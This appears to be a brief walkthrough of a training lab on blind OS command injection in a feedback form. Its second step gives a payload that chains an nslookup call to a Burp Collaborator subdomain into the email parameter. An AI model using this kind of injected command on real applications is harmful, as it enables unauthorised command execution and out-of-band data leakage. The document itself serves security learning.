This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.  
<br/>**1\. You can find the vulnerability in the 'submit feedback' section**  
<br/>![768cf55f096d66f88d0f4402d7afe88d.png](../_resources/768cf55f096d66f88d0f4402d7afe88d.png)  
**  
<br/>2\. This section sends a request where you will change the email parameter to our payload:  
**  
`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`**![4ce69bcc5b220aebf3fc1f8ff3ae5ac6.png](../_resources/4ce69bcc5b220aebf3fc1f8ff3ae5ac6.png)  
****  
<br/>3\. After sending the request you will receive a DNS request in the burp collaborator, and with that you have solved the lab  
![43751d94fdc2eda31fe17e40970e0cc6.png](../_resources/43751d94fdc2eda31fe17e40970e0cc6.png)  
**

&nbsp;